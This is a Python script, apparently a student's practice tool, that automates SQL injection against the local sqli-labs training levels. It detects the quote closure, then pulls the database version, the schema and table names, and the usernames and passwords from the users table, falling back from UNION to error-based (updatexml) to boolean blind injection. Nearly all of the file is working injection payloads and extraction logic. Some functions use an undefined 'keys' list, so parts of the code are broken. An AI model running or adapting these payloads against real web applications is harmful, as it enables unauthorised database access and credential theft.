import re
import requests
import threading
import time


# 为线程定义一个函数
class DownThread:
    def __init__(self):
        self._running = False
    def startThread(self):
        self._running = True
    def terminate(self):
        self._running = False

    def run(self,delay=1):
        n = 0
        while True :
            time.sleep(delay)
            if  self._running:
                print(".", end="")
                n = n + 1
                if n % 20 == 0:
                    print("")



C_select_thread = DownThread()
select_thread = threading.Thread(target=C_select_thread.run)
select_thread.start()







# 这是闭合模式
Closed_mode = ""
# 这是正确的模式传出header里面的Content—Length的长度
# 继续开发需要改为test
ContentLength_State_True = ""
ContentLength_State_text_True = ""
# version()的长度
nVersion_lenth = 0
# 正确的version()字符串
szbuf_vertion = ""
# order by 的返回结果
ContentLength_Order_by = ""
# select 联合查询字段数
nSelect_lenth = 0
# 判断是否总是空输出
szbuf_empty = 0
# # 包含所有字母、下划线、数字、"."
# keys = [".", '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
#         "_", "q", 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a',
#         's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm',
#         'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 'A', 'S', 'D', 'F', 'G', 'H', 'J',
#         'K', 'L', 'Z', 'X', 'C', 'V', 'B', 'N', 'M'
#         ]
# keys_capital = ['Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'Z', 'X',
#                 'C', 'V', 'B', 'N', 'M']
keys_capital_01=('A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J')
keys_capital_02=('K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S')
keys_capital_03=('T', 'U', 'V', 'W', 'X', 'Y', 'Z')

keys_lowercase_01 = []
keys_lowercase_02 = []
keys_lowercase_03 = []
n = "a"
while n <= "j":
    test = ord(n)
    keys_lowercase_01.append(n)
    test += 1
    n = chr(test)
while n <= "s":
    test = ord(n)
    keys_lowercase_02.append(n)
    test += 1
    n = chr(test)
while n <= "z":
    test = ord(n)
    keys_lowercase_03.append(n)
    test += 1
    n = chr(test)

# keys_lowercase = ["q", 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z',
#                   'x', 'c', 'v', 'b', 'n', 'm']
keys_number = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
key_special_01 = "."
key_special_02 = "_"
# # 46 95
# # 48-57 数字
# # 65-90 大写
# # 97-122 小写


list_Closed_mode_true=[
'''1 and 1 = 1 --+''',
"""1' and 1 = 1 --+""",
"""1') and 1 = 1 --+""",
"""1')) and 1 = 1 --+""",
'''1" and 1 = 1 --+''',
'''1") and 1 = 1 --+''',
'''1")) and 1 = 1 --+'''
]
list_Closed_mode_false=[
'''1 and 1 = 0 --+''',
"""1' and 1 = 0 --+""",
"""1') and 1 = 0 --+""",
"""1')) and 1 = 0 --+""",
'''1" and 1 = 0 --+''',
'''1") and 1 = 0 --+''',
'''1")) and 1 = 0 --+'''
]


# 这里是遍历我的闭合模式然后判断是哪种闭合模式
def Closed_mode_function():
    print("判断闭合方式")
    global ContentLength_State_True
    global Closed_mode
    global ContentLength_State_text_True
    for Closed_mode_key in range(7):
        print("[", list_Closed_mode_true[Closed_mode_key][1:-13], "]", end=" ")
        test_url = url + list_Closed_mode_true[Closed_mode_key]
        # 发起请求: 获取网页的内容
        # print(test_url)
        content_test_true = requests.get(url=test_url)
        # 得到Content-Length然后对比是否正确
        content_true = content_test_true.headers["Content-Length"]

        test_url = url + list_Closed_mode_false[Closed_mode_key]
        content_test_false = requests.get(url=test_url)
        content_false = content_test_false.headers["Content-Length"]
        # 如何得到闭合模式 则保存到全局变量
        if content_true != content_false or content_test_true.text != content_test_false.text:
            print("[ok]")
            ContentLength_State_True = content_true
            ContentLength_State_text_True = content_test_true.text
            Closed_mode = list_Closed_mode_true[Closed_mode_key]
            break






# 报错注入详细信息
def Erorr_information(szbuf_test_url):
    szbuf_empty = 0
    # url_bool_test = url + Closed_mode[:-13] + " and 0  union SELECT updatexml(1,concat(0x7e,version()),3) %23"
    # 保存自定义 http header 的字典，其中可以添加自定义的 http 头
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36 Edg/85.0.564.51',
        'abcdefg': 'hijklmn'
    }
    for ele in range(100):
        url_bool_test = url + Closed_mode[:-13] + szbuf_test_url + "{},1)),0) -- 1".format(ele)
        # print(url_bool_test)
        # 发起请求: 获取网页的内容
        content = requests.get(url=url_bool_test, headers=headers)
        # <font size="3" color="#FFFF00">XPATH syntax error: '~5.5.53'<br></font>
        szbuf_Erorr = re.findall("XPATH syntax error:(.*?)</font>", content.text)
        if len(szbuf_Erorr) > 0:
            print("\n","".join(szbuf_Erorr)[3:-6],end="  ")
            szbuf_empty += 1
        else:
            if szbuf_empty == 0:
                return 0
            return 1


# 报错注入详细信息
def Erorr_information_username_password(szbuf_test_url_01,szbuf_test_url_02):
    print("\n\n开始输出：（格式例）username----password\n")
    szbuf_empty = 0
    # url_bool_test = url + Closed_mode[:-13] + " and 0  union SELECT updatexml(1,concat(0x7e,version()),3) %23"
    # 保存自定义 http header 的字典，其中可以添加自定义的 http 头
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36 Edg/85.0.564.51',
        'abcdefg': 'hijklmn'
    }
    for ele in range(100):
        url_bool_test_01 = url + Closed_mode[:-13] + szbuf_test_url_01 + "{},1)),0) -- 1".format(ele)
        url_bool_test_02 = url + Closed_mode[:-13] + szbuf_test_url_02 + "{},1)),0) -- 1".format(ele)
        # print("报错注入payload:",url_bool_test_02)
        # 发起请求: 获取网页的内容
        content_01 = requests.get(url=url_bool_test_01, headers=headers)
        # <font size="3" color="#FFFF00">XPATH syntax error: '~5.5.53'<br></font>
        szbuf_Erorr_01 = re.findall("XPATH syntax error:(.*?)</font>", content_01.text)
        content_02 = requests.get(url=url_bool_test_02, headers=headers)
        # <font size="3" color="#FFFF00">XPATH syntax error: '~5.5.53'<br></font>
        szbuf_Erorr_02 = re.findall("XPATH syntax error:(.*?)</font>", content_02.text)
        if len(szbuf_Erorr_01) > 0 or len(szbuf_Erorr_02) > 0:
            print("".join(szbuf_Erorr_01)[3:-6],end="-----")
            print("".join(szbuf_Erorr_02)[3:-6])
            szbuf_empty += 1
        else:
            if szbuf_empty == 0:
                print("判断没有信息，自动开始盲注\n")
                Blind_Injection()
            return 








# 错误信息注入
def Erorr_Injection(szbuf_test_url):
    C_select_thread.terminate()
    # url_bool_test = url + Closed_mode[:-13] + " and 0  union SELECT updatexml(1,concat(0x7e,version()),3) %23"
    url_bool_test = url + Closed_mode[:-13] + szbuf_test_url
    print("\n报错注入payload:",url_bool_test)
    # 保存自定义 http header 的字典，其中可以添加自定义的 http 头
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36 Edg/85.0.564.51',
        'abcdefg': 'hijklmn'
    }
    # 发起请求: 获取网页的内容
    content = requests.get(url=url_bool_test, headers=headers)
    # <font size="3" color="#FFFF00">XPATH syntax error: '~5.5.53'<br></font>
    szbuf_Erorr = re.findall("XPATH syntax error:(.*?)</font>", content.text)
    if len(szbuf_Erorr) > 0 :
        print("\n","".join(szbuf_Erorr)[3:-6])
        print("报错注入成功")

    bWhile_value = True
    url_select_database = " or updatexml(1,concat(0x7e, (select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit "
    count = Erorr_information(url_select_database)
    if count == 0:
        return 0
    url_select_database_01 = " or updatexml(1,concat(0x7e, (select username from users  limit "
    url_select_database_02 = " or updatexml(1,concat(0x7e, (select password from users  limit "
    Erorr_information_username_password(url_select_database_01,url_select_database_02)





# 盲注下的指定查询长度
def Get_lenth_Blind(szbuf_test_url):
    for ele in range(1, 10):
        # url_bool_test = url + Closed_mode[:-13] + " and length(version())="+"{} %23".format(ele)
        url_bool_test = url + Closed_mode[:-13] + szbuf_test_url + "{} %23".format(ele)
        # print(url_bool_test)
        content_test_true = requests.get(url=url_bool_test)
        content_true = content_test_true.headers["Content-Length"]
        if content_test_true.text == ContentLength_State_text_True:
            print("")
            print("盲注payload:", url_bool_test)
            # print("version()的长度为{}".format(ele))
            nVersion_lenth = ele + 1
            return nVersion_lenth




# 盲注下的根据长度查询详细信息
def Get_Information_Blind(szbuf_test_url,lenth):
    C_select_thread.startThread()
    szbuf_TEST = ""
    for ele in range(1, lenth):
        for key in keys:
            # url_bool_test = url + Closed_mode[:-13] + " and substr(version()"+",{},1)={} %23".format(ele, hex(ord(key)))
            url_bool_test = url + Closed_mode[:-13] + szbuf_test_url+",{},1)={} %23".format(ele, hex(ord(key)))
            # print(url_bool_test)
            content_test_true = requests.get(url=url_bool_test)
            content_true = content_test_true.headers["Content-Length"]
            if content_test_true.text == ContentLength_State_text_True:
                # print(key,end="")
                szbuf_TEST += key
                break
    return szbuf_TEST

# 高效率盲注
def Blind_Injection_height_LEVEL(szbuf_test_url):
    print("\n尝试盲注")
    global key_special_01
    global key_special_02
    global nVersion_lenth
    global szbuf_vertion
    nCouut = 4
    while True:
        url_bool_test = url + Closed_mode[:-13] + " and length({})>={} %23".format(szbuf_test_url,nCouut)
        print(url_bool_test)
        content_test_true = requests.get(url=url_bool_test)
        content_true = content_test_true.headers["Content-Length"]
        if content_test_true.text == ContentLength_State_text_True:
            nCouut *= 2
        else:
            print("false")
            C_select_thread.startThread()
            break
    for ele in range(nCouut // 2, nCouut + 1):
        url_bool_test = url + Closed_mode[:-13] + " and length({})={} %23".format(szbuf_test_url,ele)
        # print(url_bool_test)
        content_test_true = requests.get(url=url_bool_test)
        content_true = content_test_true.headers["Content-Length"]
        if content_test_true.text == ContentLength_State_text_True:
            C_select_thread.terminate()
            print("")
            print("payload:", url_bool_test)
            print("长度为{}".format(ele))
            # C_select_thread.startThread()
            nVersion_lenth = ele + 1
            break

    for ele in range(1, nVersion_lenth):

        # 判断是不是小写字母
        url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)>={} %23".format(szbuf_test_url, ele,hex(ord("a")))
        content_test_true = requests.get(url=url_bool_test)
        content_true = content_test_true.headers["Content-Length"]
        if content_test_true.text == ContentLength_State_text_True:
            url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)<={} %23".format(szbuf_test_url, ele,
                                                                                            hex(ord("z")))
            content_test_true = requests.get(url=url_bool_test)
            content_true = content_test_true.headers["Content-Length"]
            if content_test_true.text == ContentLength_State_text_True:
                url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)>={} %23".format(szbuf_test_url, ele,
                                                                                                hex(ord("k")))
                content_test_true = requests.get(url=url_bool_test)
                content_true = content_test_true.headers["Content-Length"]
                if content_test_true.text == ContentLength_State_text_True:
                    url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)>={} %23".format(szbuf_test_url, ele,
                                                                                                    hex(ord("t")))
                    content_test_true = requests.get(url=url_bool_test)
                    content_true = content_test_true.headers["Content-Length"]
                    if content_test_true.text == ContentLength_State_text_True:
                        for key in keys_lowercase_03:
                            url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)={} %23".format(
                                szbuf_test_url, ele,
                                hex(ord(key)))
                            # print(url_bool_test)
                            content_test_true = requests.get(url=url_bool_test)
                            content_true = content_test_true.headers["Content-Length"]
                            if content_test_true.text == ContentLength_State_text_True:
                                # print(key,end="")
                                szbuf_vertion += key
                                print(key,end="")
                                break
                    else:
                        for key in keys_lowercase_02:
                            url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)={} %23".format(
                                szbuf_test_url, ele,
                                hex(ord(key)))
                            # print(url_bool_test)
                            content_test_true = requests.get(url=url_bool_test)
                            content_true = content_test_true.headers["Content-Length"]
                            if content_test_true.text == ContentLength_State_text_True:
                                # print(key,end="")
                                szbuf_vertion += key
                                print(key, end="")
                                break
                else:
                    for key in keys_lowercase_01:
                        url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)={} %23".format(
                            szbuf_test_url, ele,
                            hex(ord(key)))
                        # print(url_bool_test)
                        content_test_true = requests.get(url=url_bool_test)
                        content_true = content_test_true.headers["Content-Length"]
                        if content_test_true.text == ContentLength_State_text_True:
                            # print(key,end="")
                            szbuf_vertion += key
                            print(key, end="")
                            break



        url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)>={} %23".format(szbuf_test_url,ele,hex(ord("0")))
        content_test_true = requests.get(url=url_bool_test)
        content_true = content_test_true.headers["Content-Length"]
        if content_test_true.text == ContentLength_State_text_True:
            url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)<={} %23".format(szbuf_test_url,ele, hex(
                ord("9")))
            content_test_true = requests.get(url=url_bool_test)
            content_true = content_test_true.headers["Content-Length"]
            if content_test_true.text == ContentLength_State_text_True:
                for key in keys_number:
                    url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)={} %23".format(szbuf_test_url,ele,
                                                                                                          hex(ord(key)))
                    # print(url_bool_test)
                    content_test_true = requests.get(url=url_bool_test)
                    content_true = content_test_true.headers["Content-Length"]
                    if content_test_true.text == ContentLength_State_text_True:
                        # print(key,end="")
                        szbuf_vertion += key
                        print(key,end="")
                        break
        #判断是不是句号
        url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)={} %23".format(szbuf_test_url,ele,hex(ord(key_special_01)))
        content_test_true = requests.get(url=url_bool_test)
        content_true = content_test_true.headers["Content-Length"]
        if content_test_true.text == ContentLength_State_text_True:
            szbuf_vertion += key_special_01
            print(key_special_01, end="")
        #判断是不是_下划线
        url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)={} %23".format(szbuf_test_url,ele,hex(ord(key_special_02)))
        content_test_true = requests.get(url=url_bool_test)
        content_true = content_test_true.headers["Content-Length"]
        if content_test_true.text == ContentLength_State_text_True:
            szbuf_vertion += key_special_02
            print(key_special_02, end="")

    C_select_thread.terminate()
    if len(szbuf_vertion) == 0:
        return 0
    print("")
    print("\n盲注成功\n")
    #print(szbuf_vertion)
    #print("")
    return 1



# 盲注
def Blind_Injection():
    time.sleep(0.5)
    C_select_thread.startThread()
    global nVersion_lenth
    global szbuf_vertion
    for ele in range(1, 10):
        url_bool_test = url + Closed_mode[:-13] + " and length(version())={} %23".format(ele)
        # print(url_bool_test)
        content_test_true = requests.get(url=url_bool_test)
        content_true = content_test_true.headers["Content-Length"]
        if content_test_true.text == ContentLength_State_text_True:
            C_select_thread.terminate()
            print("")
            print("尝试盲注\n")
            print("盲注payload:", url_bool_test)
            print("长度为{}".format(ele))
            C_select_thread.startThread()
            nVersion_lenth = ele + 1
            break

    for ele in range(1, nVersion_lenth):
        for key in keys:
            url_bool_test = url + Closed_mode[:-13] + " and substr(version(),{},1)={} %23".format(ele, hex(ord(key)))
            # print(url_bool_test)
            content_test_true = requests.get(url=url_bool_test)
            content_true = content_test_true.headers["Content-Length"]
            if content_test_true.text == ContentLength_State_text_True:
                # print(key,end="")
                szbuf_vertion += key
                break
    C_select_thread.terminate()
    print("\n盲注成功\n")
    print("版本信息：", szbuf_vertion)
    url_select_database = " and length(database())="
    test_lenth = Get_lenth_Blind(url_select_database)
    url_select_database = " and substr(database()"
    search_test = Get_Information_Blind(url_select_database,test_lenth)
    C_select_thread.terminate()
    print("")
    print(search_test)
    # url_select_database = " and 0 union SELECT 1,group_concat(username),group_concat(password) FROM users %23 "
    # Get_Information(url_select_database)
    


# 联合注入下的指定查询
def Get_Information(szbuf_test_url):
    global url
    global szbuf_empty
    url_Get_Information_test = url + Closed_mode[:-13] + szbuf_test_url
    print("")
    print("联合注入payload：",url_Get_Information_test)
    # 保存自定义 http header 的字典，其中可以添加自定义的 http 头
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36 Edg/85.0.564.51',
        'abcdefg': 'hijklmn'
    }
    # 发起请求: 获取网页的内容
    content = requests.get(url=url_Get_Information_test, headers=headers)
    szbuf_name = re.findall("Your Login name:(.*?)<br>", content.text)
    szbuf_password = re.findall("Your Password:(.*?)</font>", content.text)
    # <font color="#FFFF00">Unknown column 'user' in 'field list'</font>
    szbuf_Unknown = re.findall('Unknown (.*?)</font>', content.text)
    szbuf_Error = re.findall('You have an error (.*?)<br></font>', content.text)
    C_select_thread.terminate()
    print("")
    if len(szbuf_name) > 0 and len(szbuf_password) > 0:
        print("".join(szbuf_name))
        print("".join(szbuf_password))
    elif len(szbuf_Unknown) > 0:
        print("请检查库名or表名是否有误~！")
        print("Unknown","".join(szbuf_Unknown))
    elif len(szbuf_Error) > 0:
        print("报错啦~！~！")
        print("You have an error", "".join(szbuf_Error))
    else:
        return 1







# 联合注入
def select_Injection():
    print("即将开始联合注入\n")
    C_select_thread.startThread()
    global ContentLength_Order_by
    global url
    for ele in range(1, 10):
        url_bool_test = url + Closed_mode[:-13] + " and 0 order by {} %23".format(ele)
        content_test_true = requests.get(url=url_bool_test)
        content_true = content_test_true.headers["Content-Length"]
        if content_true != ContentLength_Order_by and ele > 1:
            # print("payload：",url + Closed_mode[:-13] + " and 0 order by {} %23".format(ele - 1))
            nSelect_lenth = ele - 1
            C_select_thread.terminate()
            print("")
            print("select查询的字段数为:{}".format(nSelect_lenth))
            break
        ContentLength_Order_by = content_true

    # 开始自动查询版本信息和database()
    szbuf_test_url = " and 1 = 0 union select 1,version(),database() %23"
    count = Get_Information(szbuf_test_url)
    if count:
        return 1
    bWhile_value = True
    url_select_database = " and 0 union SELECT 1,group_concat(username),group_concat(password) FROM users %23 "
    C_select_thread.startThread()
    Get_Information(url_select_database)





for ele in range(1,11):
    # 这是url
    url = "http://127.0.0.1/sqli-labs/Less-{}/?id=".format(ele)
    if ele > 1:
        print("")
        print("")
        print("")
    print("url:",url[:-5])
    Closed_mode_function()
    count = select_Injection()
    if count:
        print("判断联合查询失败，自动开始报错注入\n")
        count_02 = Erorr_Injection(" and 0  union SELECT updatexml(1,concat(0x7e,version()),3) %23")
        if count_02 == 0 :
            print("判断报错注入失败,没有获取信息，自动开始盲注\n")
            if Blind_Injection_height_LEVEL("version()") == 0:
                print("\n第{}关联合注入、报错注入、盲注都失败了\n".format(ele))
                continue
            Blind_Injection_height_LEVEL("database()")
    print("\n第{}关注入成功\n".format(ele))
    print("开始下一关")

print("\n哈哈哈我退出了\n")